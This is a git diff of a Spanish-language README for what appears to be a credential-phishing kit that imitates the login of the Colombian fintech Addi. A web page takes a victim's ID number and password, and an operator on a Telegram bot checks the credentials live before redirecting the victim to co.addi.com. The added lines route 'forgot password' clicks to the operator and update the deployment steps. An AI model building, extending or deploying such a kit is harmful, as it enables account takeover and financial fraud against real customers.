@@ -7,6 +7,7 @@ Flujo corto de verificación: el cliente ingresa **usuario y contraseña** y el 
 ```
 1. Usuario (cédula)  → bot: ✓ Cuenta existe / ✗ Cuenta no existe
 2. Contraseña        → bot: ✓ Verificación exitosa / ✗ Contraseña incorrecta
+   · Enlace «¿Olvidaste tu contraseña?» → pantalla de carga + aviso al bot: 🔑 Olvidé mi contraseña
 3. Pantalla de carga «Verificación exitosa» (la activa el asesor desde el bot)
 4. Asesor virtual (whatsapp.svg): «En unos momentos se comunicará con usted un asesor virtual»
 5. ▶ Redirección automática a https://co.addi.com
@@ -21,6 +22,7 @@ Flujo corto de verificación: el cliente ingresa **usuario y contraseña** y el 
 | `✓ Cuenta existe` / `✗ Cuenta no existe` | Valida la cédula del paso 1 |
 | `✓ Verificación exitosa` / `✗ Contraseña incorrecta` | Aprueba o rechaza el paso 2. Al aprobar se activa la pantalla de carga y el cliente termina redirigido |
 | `🗑 Borrar sesión` | Elimina la sesión |
+| 🔑 Olvidé mi contraseña (automático) | No es un botón: llega solo cuando el cliente toca «¿Olvidaste tu contraseña?» en el paso 2. La web se queda en pantalla de carga y tú recibes sus datos para ayudarlo |
 
 Otros comandos del bot: `/menu`, `/solicitudes`, `/probar`, `/borrar`.
 
@@ -40,7 +42,7 @@ Otros comandos del bot: `/menu`, `/solicitudes`, `/probar`, `/borrar`.
 ## 🚀 Puesta en marcha (resumen)
 
 1. **Firebase**: crea el proyecto, activa Firestore y **Authentication → Anónimo**.
-2. **Reglas**: pega `firestore.rules.json` en Firestore → Rules y cambia `CAMBIA-ESTE-TOKEN` por tu token.
+2. **Reglas**: pega `firestore.rules.json` en Firestore → Rules y cambia el token dentro de la función `tokenAdmin()` por uno tuyo.
 3. **Configuración (segura)**: define las variables `FIREBASE_*` en Vercel (ver `.env.example`). La página las pide a `/api/config` al cargar — **no se escriben en el código**.
 4. **Bot**: crea el bot con @BotFather → token → envíale un mensaje → saca tu `chat id` de `getUpdates`.
 5. **Vercel**: sube el proyecto y define las variables de entorno (ver `.env.example`).
@@ -101,7 +103,7 @@ Abre `http://localhost:3000` para el flujo del cliente. Para probar los botones 
 
 - `TELEGRAM_BOT_TOKEN`, `ADMIN_CHAT_ID` y TODAS las `FIREBASE_*` viven **solo en las variables de entorno de Vercel** (nunca en el código ni en el repo).
 - La página pide la configuración de Firebase a **`/api/config`**, que la lee de Vercel.
-- El token de asesor debe ser el mismo en: `firestore.rules.json` → `adminToken` y la variable `FIREBASE_ADMIN_TOKEN`.
+- El token de asesor debe ser el mismo en: `firestore.rules.json` → `tokenAdmin()` y la variable `FIREBASE_ADMIN_TOKEN`.
 - Nota honesta: la `apiKey` web de Firebase es pública por diseño (la necesita el navegador). Lo que NO se filtra son los **secretos reales** (`TELEGRAM_BOT_TOKEN`, `FIREBASE_ADMIN_TOKEN`) y la seguridad de la base se apoya en las **reglas de Firestore**.
 
 ## ⚠️ Nota producción real
